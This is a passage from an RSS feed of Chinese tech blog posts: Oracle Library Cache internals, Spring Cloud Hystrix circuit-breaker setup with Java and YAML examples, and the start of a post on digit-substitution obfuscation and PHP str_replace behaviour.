data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;http://img.blog.csdn.net/20180214222158916?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:true,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-widget-upcasted=&quot;1&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4. Hash Latch&lt;/p&gt;
&lt;p&gt;    前面讲到了哈希桶及其链表，当多个用户同时访问这些哈希桶和链表时，就会出现冲突和问题，为了实现用户对这些哈希桶及其链表的有序访问和共享，Oracle通过一种叫做哈希Latch的机制来保护这些共享资源，当一个用户需要访问或修改这些哈希桶及其链表时，需要首先获取其上的哈希Latch，期间，其他需要获取相同哈希Latch的用户或会话就需要等待，直到持有该哈希Latch的用户释放为止，需要提出的是，并不是针对每个哈希桶都有一个哈希Latch，而是一个哈希Latch覆盖多个哈希桶，这样，当不同用户即使不是访问同一个哈希桶及其链表时，只要被同一个哈希Latch覆盖，也是需要等待该哈希Latch被释放才可以。哈希Latch具体如下所示。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;4&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;http://img.blog.csdn.net/20180215172739757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;&quot; data-cke-saved-src=&quot;http://img.blog.csdn.net/20180215172739757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;http://img.blog.csdn.net/20180215172739757?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:true,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-widget-upcasted=&quot;1&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;5. Library Cache Handle&lt;/p&gt;
&lt;p&gt;　 上面我们也提到，每个哈希桶通过链表将多个可执行对象连接到一起，而这些可执行对象在其中以对象句柄形式存在在，这些句柄包含了这些对象的相关属性，例如：名称、标记、指向对象内存地址的指针等。Library Cache Handle具体如下所示。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;3&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;http://img.blog.csdn.net/20180214223038406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;&quot; data-cke-saved-src=&quot;http://img.blog.csdn.net/20180214223038406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;http://img.blog.csdn.net/20180214223038406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:true,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-widget-upcasted=&quot;1&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;6. Library Cache Object&lt;br/&gt;　 哈希桶中链表上的Handle对应的是可执行对象（Library Cache Object），这些对象由一些独立的堆（Heap）所组成，具体说，哈希桶中链表上的Handle指向这些可执行对象时，其实是指向它的第一个堆（heap 0）,其中记录了指向该对象其他堆（Heap）的指针信息等，这些堆具体包括:&lt;br/&gt;   1）依赖表（Dependency Table）：当前对象（Library Cache Object，简称LCO）依赖的其它对象信息，例如：该对象所依赖的表、视图、索引等。&lt;br/&gt;   2）子表（Child Table)：当前对象的子LCO及其相关信息。&lt;br/&gt;   3）数据块（Data Block）：当前对象的SQL语句、执行计划、执行文本等信息。&lt;br/&gt;   。。。&lt;/p&gt;
&lt;p&gt;   Library Cache Object具体如下所示。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;2&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;http://img.blog.csdn.net/20180214224422218?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;&quot; data-cke-saved-src=&quot;http://img.blog.csdn.net/20180214224422218?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;http://img.blog.csdn.net/20180214224422218?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:true,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-widget-upcasted=&quot;1&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;7.Library Cache整体示意图如下所示。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;1&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;http://img.blog.csdn.net/20180215174515834?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;&quot; data-cke-saved-src=&quot;http://img.blog.csdn.net/20180215174515834?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;http://img.blog.csdn.net/20180215174515834?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:true,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-widget-upcasted=&quot;1&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 8. 父游标/子游标（Parent Cursor/Child Cursor）&lt;/p&gt;
&lt;p&gt;     当Oracle用户提交SQL或PL/SQL等可执行对象后，这将在Library Cache中生成一个叫做游标（cursor）对象，这些游标对象可被多个会话共享，这样既节省了资源又提高了效率。同时，每个游标又由两部分表达和限定，即父游标（Parent Cursor）和子游标（Child Cursor），这些通过系统相关动态视图可以查询和了解。父游标和子游标具体如下所示。&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cke_widget_wrapper cke_widget_inline cke_widget_image cke_image_nocaption cke_widget_selected&quot; data-cke-widget-wrapper=&quot;1&quot; data-cke-filter=&quot;off&quot; data-cke-display-name=&quot;图像&quot; data-cke-widget-id=&quot;0&quot;&gt;&lt;img class=&quot;cke_widget_element has&quot; src=&quot;http://img.blog.csdn.net/20180215181105321?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; alt=&quot;&quot; data-cke-saved-src=&quot;http://img.blog.csdn.net/20180215181105321?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&quot; data-cke-widget-data=&quot;{&amp;amp;quot;hasCaption&amp;amp;quot;:false,&amp;amp;quot;src&amp;amp;quot;:&amp;amp;quot;http://img.blog.csdn.net/20180215181105321?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTEhEWl9CSg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&amp;amp;quot;,&amp;amp;quot;alt&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;width&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;height&amp;amp;quot;:&amp;amp;quot;&amp;amp;quot;,&amp;amp;quot;lock&amp;amp;quot;:true,&amp;amp;quot;align&amp;amp;quot;:&amp;amp;quot;none&amp;amp;quot;,&amp;amp;quot;classes&amp;amp;quot;:[]}&quot; data-cke-widget-upcasted=&quot;1&quot; data-cke-widget-keep-attr=&quot;0&quot; data-widget=&quot;image&quot;/&gt;&lt;span class=&quot;cke_reset cke_widget_drag_handler_container&quot;&gt;&lt;img class=&quot;cke_reset cke_widget_drag_handler&quot; title=&quot;点击并拖拽以移动&quot; src=&quot;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&quot; alt=&quot;&quot; width=&quot;15&quot; height=&quot;15&quot; data-cke-widget-drag-handler=&quot;1&quot;/&gt;&lt;span class=&quot;cke_image_resizer&quot; title=&quot;点击并拖拽以改变尺寸&quot;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 07 Aug 2018 06:38:00 +0000</pubDate>
<dc:creator>lhdz_bj</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lhdz_bj/p/9436866.html</dc:identifier>
</item>
<item>
<title>spring cloud分布式关于熔断器 - it飞</title>
<link>http://www.cnblogs.com/itgaofei/p/9436849.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/itgaofei/p/9436849.html</guid>
<description>&lt;p&gt;spring cloud分布式中，熔断器就是断路器，其实都是一个意思。&lt;/p&gt;
&lt;p&gt;为什么要使用熔断器呢？&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在分布式中，我们会根据业务或功能将项目拆分为多个服务单元，各个服务单元之间通过服务注册和订阅的方式相互依赖和调用功能，随着项目和业务的不断拓展，服务单元数量也逐渐增多，相互之间的依赖关系也越来越复杂，这时候，可能会某个服务单元出现问题或网络原因依赖调用出错或延迟，此时如果调用该依赖的请求不断增加，那么要调用该服务的服务将都会等待或者出现故障，如果后续连锁反应越来越多，Servlet容器的线程资源会被消耗完毕，导致服务瘫痪。服务与服务的依赖会导致服务之间的故障传播，从而迎来“雪崩效应“。为了解决这种每个点或多个点的故障，就有了熔断器的出现。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;什么是熔断器？&lt;/p&gt;
&lt;p&gt;&lt;span&gt;熔断器就相当于电路中的保险丝、保护器，它可以实现快速失败，如果它在某一段时间里侦测到许多类似的错误，它将不再访问远程服务器，会强迫以后的访问都会快速失败，从而防止某个服务不断地尝试执行可能会失败的操作，它会使服务继续执行而不用等待修正错误，或者浪费CPU时间去等到长时间的超时产生，从而进入回路方法。熔断器也可以使服务能够诊断错误是否已经修正，如果已经修正，服务会再次尝试调用操作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1428154/201808/1428154-20180807114345057-1554667922.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;1.在调用服务方加入熔断器依赖jar包：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;//&lt;/span&gt; &lt;span&gt;https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-starter-hystrix&lt;/span&gt;
    compile group: 'org.springframework.cloud', name: 'spring-cloud-starter-hystrix'
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2.在Controller中：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;39&quot;&gt;
&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
@Controller
//@EnableWebSecurity 安全检查controller还要继承extends WebSecurityConfigurerAdapter
public class PageController   {

    public static Logger logger=LoggerFactory.getLogger(PageController.class);

    @Autowired
    private RestTemplate restTemplate;


    @HystrixCommand(fallbackMethod = &quot;toIndex1&quot;)//断路器进入回路方法
    @RequestMapping(&quot;/toIndex1&quot;)
    public String toIndex(Model model){

        System.out.println(&quot;进入toIndex&quot;);
        logger.info(&quot;执行调用&quot;);
        String msg=restTemplate.getForEntity(&quot;http://project-solr/SolrSearch&quot;,String.class).getBody();//project-solr是调用注册中心里的名字
        logger.info(&quot;调用结束&quot;);
        model.addAttribute(&quot;msg&quot;,msg);
        return &quot;index&quot;;
    }

    public String toIndex1(Model model){
        System.out.println(&quot;进入回路方法&quot;);
        model.addAttribute(&quot;msg&quot;,&quot;服务不可用,请稍后重试&quot;);
        return &quot;index&quot;;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;注意：在调用方服务Controller中的方法上加上@HystrixCommand(fallbackMethod = &quot;回路方法&quot;)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　这里我让回路方法调用的是toIndex1，要注意回路方法返回值，参数要与原方法一致&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　在被调用方的方法中制造故障：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1428154/201808/1428154-20180807115836533-531575602.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.在调用方的启动类加注解@EnableCircuitBreaker启动熔断器&lt;/p&gt;
&lt;p&gt;　　启动：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1428154/201808/1428154-20180807120422761-2117933927.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;img src=&quot;https://images2018.cnblogs.com/blog/1428154/201808/1428154-20180807120327400-1702153241.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 可以看到进入了回路方法&lt;/p&gt;
&lt;p&gt;当然还可以在调用方进行配置：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
hystrix:
  command:
    default:
     execution:
      isolation:
        thread:
         timeoutInMilliseconds: 2000 #请求响应时间 如果过了这个时间就会进入回路方法
     circuitBreaker:
          requestVolumeThreshold: 2 # 服务降级:此请求连续多少次响应过慢或崩溃 系统就默认把它当成一个崩溃的方法 在一定时间内调用此方法会直接进入回路方法 这样执行更快 默认值是20 请求该方法20次 如果崩溃或响应过慢率大于百分之八十 就会默认它是一个崩溃方法 
　　　　　　#timeout:
　　　　　　　　#enabled: false #取消超时检查 无论线程运行多久 只要不崩溃就不进入回路方法 一般情况不使用
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;配置完后运行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1428154/201808/1428154-20180807142159056-1391287291.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行好几次发现它会前两次会访问并等待相应结果，后面不再访问就直接回应结果进入回路方法&lt;/p&gt;
&lt;p&gt;当然这是根据配置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1428154/201808/1428154-20180807142822144-1912077192.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;spring cloud熔断器就说到这里，想了解spring cloud其他内容，请浏览我以前博客&lt;/p&gt;
&lt;p&gt;若觉得有用点个赞吧(●'◡'●)&lt;/p&gt;
&lt;p&gt;欢迎来点评(●'◡'●)&lt;/p&gt;
</description>
<pubDate>Tue, 07 Aug 2018 06:34:00 +0000</pubDate>
<dc:creator>it飞</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/itgaofei/p/9436849.html</dc:identifier>
</item>
<item>
<title>可前端解密的加密方法探讨和str_replace和preg_replace分析 - 冒雨ing</title>
<link>http://www.cnblogs.com/saysmy/p/9430530.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/saysmy/p/9430530.html</guid>
<description>&lt;h3&gt; 目的：&lt;/h3&gt;
&lt;p&gt;对字符串‘123456’进行后端加密，前端js可解密出真实字符&lt;/p&gt;

&lt;p&gt;测试代码php：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;$hashMap&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;&lt;span&gt;(
            &lt;/span&gt;'0' =&amp;gt; '4',
            '1' =&amp;gt; '9',
            '2' =&amp;gt; '1',
            '3' =&amp;gt; '7',
            '4' =&amp;gt; '2',
            '5' =&amp;gt; '8',
            '6' =&amp;gt; '3',
            '7' =&amp;gt; '6',
            '8' =&amp;gt; '5',
            '9' =&amp;gt; '0',&lt;span&gt;
        );

&lt;/span&gt;&lt;span&gt;print_r&lt;/span&gt;(&lt;span&gt;array_keys&lt;/span&gt;(&lt;span&gt;$hashMap&lt;/span&gt;));&lt;span&gt;echo&lt;/span&gt; '==1=='&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;print_r&lt;/span&gt;(&lt;span&gt;array_values&lt;/span&gt;(&lt;span&gt;$hashMap&lt;/span&gt;));&lt;span&gt;echo&lt;/span&gt; '==2=='&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;$a&lt;/span&gt; = '123456'&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;str_replace&lt;/span&gt;(&lt;span&gt;array_keys&lt;/span&gt;(&lt;span&gt;$hashMap&lt;/span&gt;), &lt;span&gt;array_values&lt;/span&gt;(&lt;span&gt;$hashMap&lt;/span&gt;), &lt;span&gt;$a&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;Array&lt;/span&gt;&lt;span&gt;
(
   [&lt;/span&gt;0] =&amp;gt; 0&lt;span&gt;
   [&lt;/span&gt;1] =&amp;gt; 1&lt;span&gt;
   [&lt;/span&gt;2] =&amp;gt; 2&lt;span&gt;
   [&lt;/span&gt;3] =&amp;gt; 3&lt;span&gt;
   [&lt;/span&gt;4] =&amp;gt; 4&lt;span&gt;
   [&lt;/span&gt;5] =&amp;gt; 5&lt;span&gt;
   [&lt;/span&gt;6] =&amp;gt; 6&lt;span&gt;
   [&lt;/span&gt;7] =&amp;gt; 7&lt;span&gt;
   [&lt;/span&gt;8] =&amp;gt; 8&lt;span&gt;
   [&lt;/span&gt;9] =&amp;gt; 9&lt;span&gt;
)
&lt;/span&gt;==1==&lt;span&gt;Array&lt;/span&gt;&lt;span&gt;
(
   [&lt;/span&gt;0] =&amp;gt; 4&lt;span&gt;
   [&lt;/span&gt;1] =&amp;gt; 9&lt;span&gt;
   [&lt;/span&gt;2] =&amp;gt; 1&lt;span&gt;
   [&lt;/span&gt;3] =&amp;gt; 7&lt;span&gt;
   [&lt;/span&gt;4] =&amp;gt; 2&lt;span&gt;
   [&lt;/span&gt;5] =&amp;gt; 8&lt;span&gt;
   [&lt;/span&gt;6] =&amp;gt; 3&lt;span&gt;
   [&lt;/span&gt;7] =&amp;gt; 6&lt;span&gt;
   [&lt;/span&gt;8] =&amp;gt; 5&lt;span&gt;
   [&lt;/span&gt;9] =&amp;gt; 0&lt;span&gt;
)
&lt;/span&gt;==2==016253 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;可见输出结果是：016253&lt;/p&gt;
&lt;p&gt;而不是：917283&lt;/p&gt;
&lt;p&gt;由此可见str_replace并不是对要替换的字符串依照数组对应关系进行一次性替换，而是根据替换的数组元素，对字符串的每个元素进行挨个替换，替换的字符串为上一次替换的结果&lt;/p&gt;
&lt;p&gt;替换过程如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
对0进行替换：123456
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;对1进行替换：923456&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;对2进行替换：&lt;/span&gt;913456&lt;span&gt;
对3进行替换：&lt;/span&gt;917456&lt;span&gt;
对4进行替换：&lt;/span&gt;917256&lt;span&gt;
对5进行替换：&lt;/span&gt;917286&lt;span&gt;
对6进行替换：&lt;/span&gt;917283&lt;span&gt;
对7进行替换：&lt;/span&gt;916283&lt;span&gt;
对8进行替换：&lt;/span&gt;916253&lt;span&gt;
对9进行替换：&lt;/span&gt;016253
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最终得到“016253”&lt;/p&gt;
&lt;p&gt;preg_replace和str_replace替换规则一致，只是替换规则数组要改成正则方式：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;$hashMap&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;&lt;span&gt;(
            &lt;/span&gt;'/0/' =&amp;gt; '4',
            '/1/' =&amp;gt; '9',
            '/2/' =&amp;gt; '1',
            '/3/' =&amp;gt; '7',
            '/4/' =&amp;gt; '2',
            '/5/' =&amp;gt; '8',
            '/6/' =&amp;gt; '3',
            '/7/' =&amp;gt; '6',
            '/8/' =&amp;gt; '5',
            '/9/' =&amp;gt; '0',&lt;span&gt;
        );&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;那如果想只是简单的按照加密序列值只进行单个字母或数字的一次性替换该怎么办？、&lt;/p&gt;
&lt;p&gt;目前可以考虑用字符串循环的方式挨个替换一次，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;51&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; mixHash(&lt;span&gt;$str&lt;/span&gt;=''&lt;span&gt;){
        
        &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;$hashMap&lt;/span&gt; = &lt;span&gt;array&lt;/span&gt;&lt;span&gt;(
                    &lt;/span&gt;'0' =&amp;gt; '4',
                    '1' =&amp;gt; '9',
                    '2' =&amp;gt; '1',
                    '3' =&amp;gt; '7',
                    '4' =&amp;gt; '2',
                    '5' =&amp;gt; '8',
                    '6' =&amp;gt; '3',
                    '7' =&amp;gt; '6',
                    '8' =&amp;gt; '5',
                    '9' =&amp;gt; '0',&lt;span&gt;
                );

